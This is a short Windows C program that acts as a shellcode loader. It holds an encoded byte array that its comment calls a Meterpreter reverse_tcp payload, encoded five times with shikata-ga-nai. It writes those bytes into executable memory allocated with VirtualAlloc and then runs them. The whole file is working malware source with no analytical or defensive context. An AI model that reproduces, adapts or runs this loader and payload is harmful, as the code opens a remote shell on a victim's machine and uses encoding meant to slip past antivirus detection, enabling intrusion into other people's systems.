#include <windows.h>

int main() {

  // Set the payload: meterpreter/reverse_tcp encoded 5 times with shikata-ga-nai 
  unsigned char payload[] = "\xdb\xc6\xb8\x63\xb7\x7c\xbd\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
    "\x64\x31\x43\x19\x03\x43\x19\x83\xc3\x04\x81\x42\xc1\x82\x9c"
    "\x87\x4b\x26\xd7\x01\xdf\xfc\x13\xe9\x0b\x34\x6a\x57\xcf\x06"
    "\x88\x59\xa7\x97\x93\xf1\x26\x7a\x59\x02\xad\xb1\x36\x38\x8c"
    "\x90\x82\x0b\xb8\xc1\x20\x15\xfb\x56\xd9\xc9\x6d\x7f\x43\xf0"
    "\x04\x9a\x2e\x94\xf0\x86\xf3\x89\xaf\x33\x5c\x72\xc9\x9b\x10"
    "\x00\xa0\x22\xb1\xad\x98\x3b\xac\xea\xd0\x3a\x5c\x47\xa1\xc9"
    "\xc6\x6f\xf7\xb1\xa9\x76\x63\xcf\x1f\xe7\x2a\xa3\x3c\x2e\x84"
    "\x14\xad\x56\xab\xce\x3f\xe7\x35\x76\xe1\x7e\x84\x41\xea\xa7"
    "\x6c\x33\x6c\x9f\x06\x1a\x76\x09\xa7\x05\x4c\x74\x23\xe2\xd7"
    "\x9d\x91\x1f\x52\x64\x2d\x9f\xec\x41\x2f\xef\x26\xa4\x05\x7d"
    "\x1a\xeb\x75\x40\x8e\xd4\xb7\xe9\x36\xd0\x16\xbf\x2d\xcd\xdf"
    "\xdb\x83\x37\x73\x81\xc7\xf4\x9d\xed\x6c\x0b\xde\xee\xd9\xe7"
    "\x1b\x73\xef\x77\x6b\xdf\xb6\xb8\x75\x96\x5d\x58\x3d\xef\x77"
    "\x71\x05\xc4\x4b\x23\x19\x22\x69\xc7\x4a\x2c\x9c\xbd\x37\x7f"
    "\xeb\x42\xd2\xd8\x3a\x1d\xb8\x6c\xa0\x30\x96\x4d\x62\x26\xe4"
    "\xa8\x69\x5b\xd6\x15\x84\x0c\x89\x9d\xef\x22\x0e\x0f\x60\x64"
    "\x7b\xeb\x8e\xc9\xea\xdf\x6d\x23\x59\xb5\x01\xbb\x37\xc8\x79"
    "\xa8\xe7\xd9\x79\x23\x96\x1e\xc4\x15\x5b\x5e\x36\x8b\x9e\x77"
    "\xed\x4c\xb9\x5e\x77\x2a\x59\xaa\xf4\x79\x12\xf1\xfe\x3c\x40"
    "\xf1\x79\x23\xf8\x25\x0b\x50\xf8\xdb\xef\xd4\x41\x37\x55\x71"
    "\xc4\x64\x62\xbd\xea\xb1\x90\x59\x1d\x4f\x7c\x65\x81\xa5\x62"
    "\xbf\x41\x80\x83\xa9\x66\x39\x07\x0b\x3a\xc1\xba\x12\xaf\x8d"
    "\x16\x25\xf9\x1e\x3e\x6e\x48\x73\xdd\x6b\x55\xd0\x10\xb0\xc5"
    "\xd2\x33\x29\x2d\x97\x88\x8c\x35\xb3\x4a\xe9\x19\xfa\xb1\xdd"
    "\xcb\x9d\xd6\x0b\x57\x6b\x8a\xe8\xe1\x33\x92\xaf\xdb\x82\x4b"
    "\x62\x59\xa4\x20\x30\x9a\x37\x56\x31\x6e\x06\x79\xd5\x0a\x30"
    "\xee\xd1\xcb\x35\x91\x72\x71\x8f\x42\xab\xf7\x99\x3e\xc3\xba"
    "\x67\xe9\xf4\x88\x33";

  // Create a rwx buffer to store the payload in.
  char *rwx = (char *)VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

  // Copy the payload into the rwx buffer.
  memcpy(rwx, &payload, sizeof(payload));
  
  // Execute the payload
  void (*func) ();
  func = (void (*) ()) (u_long*)(rwx);
  (void) (*func) (); 
}

